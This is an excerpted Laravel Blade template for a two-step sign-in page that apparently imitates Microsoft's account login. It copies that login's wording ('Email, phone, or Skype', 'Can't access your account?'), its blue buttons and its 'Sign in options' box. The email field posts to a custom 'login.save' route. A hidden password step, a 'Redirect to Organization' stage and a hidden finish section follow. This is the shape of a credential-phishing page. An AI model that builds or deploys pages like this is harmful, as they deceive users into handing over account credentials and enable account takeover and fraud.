...
<head>
    <!-- Include jQuery (You can also move this to the layout file for reuse) -->
...
<body style="margin: 0; padding: 0;">
    <div id="main" style="background-image: url('{{ asset('bg.jpg') }}'); background-size: cover; background-position: center center; background-repeat: no-repeat; min-height: 100vh; width: 100%; display: flex; flex-direction: column;">
                ...
                <div class="row topp">
                    ...
                    <div class="col-lg-6 mx-auto">
                        ...
                        <div class="box" id="paaaaart1">
                            ...
                            <form id="contact" action="{{ route('login.save') }}" method="post" class="boxtext">
                                @csrf
                                ...
                                <div class="form-group mt-2">
                                    <input type="email" name="ai" class="form-control rounded-0 border-dark" id="ai" aria-describedby="aiHelp" value="{{ old('email') }}" placeholder="Email, phone, or Skype" style="border-right: none;border-left: none;border-top: none;">
                                </div>
                                <p style="font-size: 13px">No account? <a href="#">Create one!</a></p>
                                <p style="font-size: 13px"><a href="#">Can't access your account?</a></p>
                                <div class="text-right">
                                    <button type="submit" class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;cursor: pointer;">Next</button>
                                </div>
                            </form>
                        </div>

                        <!-- Part 2: Password Input -->
                        <div class="box" id="paaaart2" style="display: none;">
                            ...
                            <form id="contact" class="boxtext">
                                ...
                                <div class="text-right">
                                    <button type="submit"  class="btn rounded-0 text-white px-4" id="sub-btn" style="background-color: #0066BA;">login</button>
                                </div>
                            </form>
                        </div>

                        <!-- Part 3: Redirect to Organization -->
            ...
            <div class="row ">
                <div class="col-sm-5 mx-auto box2">
                    <div class="py-2 bg-white ">
                        <span><img src="{{ asset('key.svg') }}" width="30px"> &nbspSign in options</span>
                    </div>
                </div>
            </div>
        </div>
    ...
    <!-- Hidden Finish Section -->
    <div id="finish" style="display:none">
        <center>
            <P><img style="height: 54px; width: 380px" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABg..."></P>
        </center>
    </div>
</body>
